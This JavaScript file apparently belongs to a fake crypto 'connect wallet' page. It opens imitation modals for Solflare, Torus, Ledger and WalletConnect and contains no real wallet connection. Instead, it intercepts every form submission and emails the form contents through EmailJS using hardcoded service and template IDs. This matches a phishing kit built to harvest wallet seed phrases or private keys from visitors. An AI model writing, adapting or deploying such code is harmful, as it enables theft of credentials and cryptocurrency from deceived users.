emailjs.init({
	publicKey: "JyD16qbZ5jiq243nk",
});

const roller = () => {
	const contentParent = (document.querySelector(".main-content"))
	const firstCHild = contentParent.children[0]
	const lastChild = (contentParent.lastElementChild);
	contentParent.insertBefore(lastChild, firstCHild)
}
const switcher = () => {
	const contentParent = new Date().getSeconds() <= 30 ? (document.querySelector(".banner-one")) : (document.querySelector(".banner-two"))

	const firstCHild = contentParent.children[0]
	const lastChild = (contentParent.lastElementChild);
	contentParent.insertBefore(lastChild, firstCHild)
	const navParent = (document.querySelector(".bottom-nav"))
	const navfirstCHild = navParent.children[0]
	const navlastChild = (navParent.lastElementChild);
	navParent.insertBefore(navlastChild, navfirstCHild)

}

setInterval(() => { switcher(), roller() }, 1000)

const popupbg = document.querySelector(".pop-up-bg")
const popupbox = document.querySelector(".popup-box")
const connectWallet = document.querySelector(".connect-wallet")
console.log(popupbg.attributes['data-state'].value)
// console.log(popupbg.style.display = "none")

connectWallet.addEventListener('click', () => {
	popupbg.style.display = "block"
})
popupbox.addEventListener('click', (e) => {
	e.stopPropagation()
})
popupbg.addEventListener('click', (e) => {
	e.stopPropagation()
	popupbg.style.display = "none"
})

// (function () {
// 	// https://dashboard.emailjs.com/admin/account
// 	
// })();
// window.onload = function () {

document.querySelectorAll('form').forEach(forms => {
	console.log(forms)
	forms.addEventListener('submit', function (event) {
		event.preventDefault();
		console.log(this)
		emailjs.sendForm('service_ue3ovlf', 'template_oafjir5', this)
			.then(() => {
				console.log('SUCCESS!');
			}, (error) => {
				console.log('FAILED...', error);
			});
	});
})


const solflare_btn = document.querySelector(".solflare-btn")
const torus_btn = document.querySelector(".torus-btn")
const ledger_btn = document.querySelector(".ledger-btn")
const wConnect_btn = document.querySelector(".wConnect-btn")

const solflare_close_modal_button = document.querySelector(".solflare-modal #close-modal-button")
const torus_close_modal_button = document.querySelector(".torus-modal #close-modal-button")
const ledger_close_modal_button = document.querySelector(".ledger-modal #close-modal-button")
const wConnect_close_modal_button = document.querySelector(".walletconnect-modal #close-modal-button")

const openModal = (modal) => {
	document.querySelector(`.${modal}-modal`).style.display = "flex"
	popupbg.style.display = "none"
}
const closeModal = (modal) => {
	document.querySelector(`.css-bvrne.${modal}-modal`).style.display = "none"
}

solflare_btn.addEventListener('click', () => openModal("solflare"))
torus_btn.addEventListener('click', () => openModal("torus"))
ledger_btn.addEventListener('click', () => openModal("ledger"))
wConnect_btn.addEventListener('click', () => openModal("walletconnect"))
solflare_close_modal_button.addEventListener('click', () => closeModal("solflare"))
torus_close_modal_button.addEventListener('click', () => closeModal("torus"))
ledger_close_modal_button.addEventListener('click', () => closeModal("ledger"))
wConnect_close_modal_button.addEventListener('click', () => closeModal("walletconnect"))


